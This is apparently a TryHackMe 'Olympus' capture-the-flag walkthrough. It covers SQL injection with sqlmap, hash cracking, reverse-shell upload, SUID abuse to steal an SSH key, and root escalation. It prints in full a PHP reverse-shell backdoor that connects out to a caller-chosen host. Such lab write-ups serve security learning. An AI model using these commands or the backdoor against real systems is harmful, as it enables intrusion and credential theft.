# Try Hack Me - Olympus
# Author: Atharva Bordavekar
# Difficulty: Medium
# Points: 
# Vulnerabilities: 

# Phase 1 - Reconnaissance: 
nmap scan:

```bash
nmap -p- --min-rate=1000 <target_ip>
```
PORT   STATE SERVICE

22/tcp open  ssh

80/tcp open  http

we cannot directly connect to the webpage since it is configured to the hostname "olympus.thm". hence we will add it in our /etc/hosts file.

```bash
echo "<target_ip> olympus.thm" | sudo tee -a /etc/hosts
```
now we can easily access the webpage. there is nothing much on this webpage so we shall run a directory fuzzer on the website to look out for the hidden directories. 

```bash
gobuster dir -u http://olympus.thm -w /usr/share/wordlists/dirb/common.txt
```
.htaccess            (Status: 403) [Size: 276]
.hta                 (Status: 403) [Size: 276]
.htpasswd            (Status: 403) [Size: 276]
~webmaster           (Status: 301) [Size: 315] [--> http://olympus.thm/~webmaster/]
index.php            (Status: 200) [Size: 1948]
javascript           (Status: 301) [Size: 315] [--> http://olympus.thm/javascript/]
phpmyadmin           (Status: 403) [Size: 276]
server-status        (Status: 403) [Size: 276]
static               (Status: 301) [Size: 311] [--> http://olympus.thm/static/]

the most relevant directory for getting the first flag would be the /~webmaster directory. lets manually enumerate it to find anything useful. on visiting the page, i found out that it user a Victor CMS. now on some google dorking, i found out that the search bar is vulnerable to SQL injections. lets fire up some manual SQLis which i found on the exploit.db report. after injecting the search field, the SQLi was confirmed. i will be using sqlmap to automate the enumeration.

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3 --batch
```

we get the databases present on the server. the most useful database to us is the olympus db. lets find out the tables present in this database using another sqlmap payload

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" -D olympus --tables --random-agent -v 3 --batch
```
we can see that we have found the table which contains the flag1 for the CTF. lets dump all the contents from all the tables which we found on the olympus database.

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" -D olympus --dump --random-agent -v 3 --batch
```
and just like that, we have found the flag1 for the CTF! we have also found some notes aswell as some password hashes for the users prometheus, root and zeus. after about half an hour of trying to crack the hashes on hashcat, we finally crack the hash of prometheus!

```bash
hashcat -m 3200 prometheus.txt /usr/share/wordlists/rockyou.txt 
```
this gives us the password for user prometheus which we can use to get a dashboard. here we find a lot of things like chats, posts, etc. but the most important thing will be the email in the users page. this email is  a possible hint for a possible vhost/subdomain. lets add it in our /etc/hosts file

```bash
echo "<target_ip> chat.olympus.thm" | sudo tee -a /etc/hosts
```
now lets find out what is cooking at the vhost url. it seems like we come across another login page. lets re-use the credentials we found for the user prometheus earlier. and we have an interface as user prometheus! we will try to upload a reverse shell file here in the chat. 

lets run gobuster to find out where the files are being stored.

```bash
gobuster dir -u http://chat.olympus.thm -w /usr/share/wordlists/dirb/common.txt
```
.htaccess            (Status: 403) [Size: 281]
.hta                 (Status: 403) [Size: 281]
.htpasswd            (Status: 403) [Size: 281]
index.php            (Status: 302) [Size: 0] [--> login.php]
javascript           (Status: 301) [Size: 325] [--> http://chat.olympus.thm/javascript/]
phpmyadmin           (Status: 403) [Size: 281]
server-status        (Status: 403) [Size: 281]
static               (Status: 301) [Size: 321] [--> http://chat.olympus.thm/static/]
uploads              (Status: 301) [Size: 322] [--> http://chat.olympus.thm/uploads/]

here we can see the /uploads directory, but we still have no idea about the name of the reverseshell which is being stored on the /uploads directory. lets use sqlmap with the --fresh-queries flag to get the exact name of the reverseshell which we uploaded. 

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" -D olympus --dump --random-agent -v 3 --batch --fresh-queries
```
as we can see, we have uploaded multiple reverseshells in the process of figuring out a way to trigger the reverseshell. lets access the reverseshell file in the browser at http://chat.olympus.thm/uploads/<reverseshell_name.php>

```bash
# first setup a netcat listener:
nc -lnvp 4444
```
now we have a shell as www-data! lets find the second flag. we find the second flag at /home/zeus/user.flag . lets escalate our privileges to user zeus. i ran linpeas.sh script and couldn't find anything useful from the scan. lets look out for any sus looking SUIDs.

```bash
find / -type f -perm -4000 2>/dev/null
```
we find a weird SUID /usr/bin/cputils. lets figure out what this does exactly. after some manual testing, i found out that this binary takes user input which is the file to be copied and then takes another user input to the exact location where we want to copy the file. using this we can simply copy the id_rsa file of user zeus

```bash
/usr/bin/cputils
# Enter the Name of Source File: /home/zeus/.ssh/id_rsa
# Enter the Name of Target File: /tmp/id_rsa
```
once this is done we simply copy paste this id_rsa private key to our attacker machine and then try to use it for the user zeus. but before we can access the ssh of user zeus, we have to crack the passphrase first. lets use ssh2john to make a hash file out of the id_rsa file and then crack it using john.

```bash
ssh2john id_rsa > id_rsa_hash
```
now its time to crack the hash
```bash
john id_rsa_hash --wordlist=/usr/share/wordlists/rockyou.txt
```
`NOTE: If you have already cracked it using john but cannot view the hash, use the "john --show id_rsa_hash"" command to view the pot file`

now we have an ssh shell as zeus. now i found an interesting directory in the /var/www/html location which was suspiciously owned by the group which zeus was a part of. we find a .php file named VIGQFQFMYOST.php. 

```bash
<?php
$pass = "a7c5ffcf139742f52a5267c4a0674129";
if(!isset($_POST["password"]) || $_POST["password"] != $pass) die('<form name="auth" method="POST">Password: <input type="password" name="password" /></form>');

set_time_limit(0);

$host = htmlspecialchars("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]", ENT_QUOTES, "UTF-8");
if(!isset($_GET["ip"]) || !isset($_GET["port"])) die("<h2><i>snodew reverse root shell backdoor</i></h2><h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host?ip=[destination of listener]&port=[listening port]");
$ip = $_GET["ip"]; $port = $_GET["port"];

$write_a = null;
$error_a = null;

$suid_bd = "/lib/defended/libc.so.99";
$shell = "uname -a; w; $suid_bd";

chdir("/"); umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if(!$sock) die("couldn't open socket");

$fdspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$proc = proc_open($shell, $fdspec, $pipes);

if(!is_resource($proc)) die();

for($x=0;$x<=2;$x++) stream_set_blocking($pipes[x], 0);
stream_set_blocking($sock, 0);

while(1)
{
    if(feof($sock) || feof($pipes[1])) break;
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if(in_array($sock, $read_a)) { $i = fread($sock, 1400); fwrite($pipes[0], $i); }
    if(in_array($pipes[1], $read_a)) { $i = fread($pipes[1], 1400); fwrite($sock, $i); }
    if(in_array($pipes[2], $read_a)) { $i = fread($pipes[2], 1400); fwrite($sock, $i); }
}

fclose($sock);
for($x=0;$x<=2;$x++) fclose($pipes[x]);
proc_close($proc);
?>
```
i used Ai to filter through the code and it found out that the code will execute an SUID named /lib/defended/libc.so.99. i executed it just for finding out what it does and we directly got a root shell!

```bash
/lib/defended/libc.so.99
# direct root shell
```
maybe this was an unintended way of getting a shell as root. lets grab the root flag present at /root/root.flag and move on to finding the bonus flag. 

as far as i know that all the flags are having the same format of `flag{....}` . so lets use this to our own advantage and find out all the files on the system which contain this set of string. we will be combining the `find` command with the `grep` command. find will search for all files on the system while grep will check each file which matches our given condition. 

```bash
find / -type f -exec grep -l "flag{" {} \;
```
`NOTE: We can speed up this process by using the hint provided by the creator.`

using the hint, we come to know that the file is present in the /etc directory. lets modify our orignal payload to search for all files in the /etc directory.

```bash
find /etc -type f -exec grep -l "flag{" {} \;
```
and just like that we find the final bonus flag which was hidden deep in the /etc directory. we read it and submit the bonus flag.
